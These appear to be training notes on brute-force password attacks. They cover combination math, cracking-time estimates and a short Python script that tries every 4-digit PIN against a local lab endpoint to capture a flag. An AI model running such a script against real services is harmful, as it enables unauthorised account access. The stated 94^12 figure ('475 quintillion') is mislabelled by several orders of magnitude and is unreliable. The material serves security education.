# Brute Force Attacks

**Understanding Brute Force Attacks:**

* Brute force attacks involve systematically trying all possible combinations to crack passwords.
* The total number of combinations can be calculated using the formula:
  * **Possible Combinations = Character Set Size^Password Length**

**Example Calculations:**

* **6-character password (lowercase letters):**
  * 26^6 ≈ 300 million combinations.
* **8-character password (lowercase letters):**
  * 26^8 ≈ 200 billion combinations.
* **8-character password (lowercase + uppercase):**
  * 52^8 ≈ 53 trillion combinations.
* **12-character password (lowercase, uppercase, numbers, symbols):**
  * 94^12 ≈ 475 quintillion combinations.

**Key Takeaways:**

* Increasing password length or complexity (adding character types) exponentially increases the search space, making brute-force attacks more difficult.
* The attacker's computational power significantly affects the time required to crack a password. More powerful hardware can attempt more guesses per second.

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption><p>Credits to HTB</p></figcaption></figure>

**Cracking Time Comparison:**

* **Basic Computer (1 million passwords/second):**
  * Cracking an 8-character alphanumeric password could take \~6.92 years.
* **Supercomputer (1 trillion passwords/second):**
  * Even with this power, cracking a complex 12-character password could take \~15,000 years.

**Practical Example: Cracking a 4-Digit PIN**

* A simple demonstration involves brute-forcing a 4-digit PIN (0000 to 9999) using a Python script.
* The script sends requests to a server endpoint, checking each PIN until the correct one is found.

**Python Script Overview:**

```python
pythonCopy Codeimport requests

ip = "127.0.0.1"  # Target system IP
port = 1234       # Target system port

# Brute-force all 4-digit PINs
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

* The script iterates through all possible PINs, checking responses to find the correct one and capture the associated flag.

**Conclusion:**

* Brute force attacks highlight the importance of strong, complex passwords and the need for robust security measures to protect against such vulnerabilities.
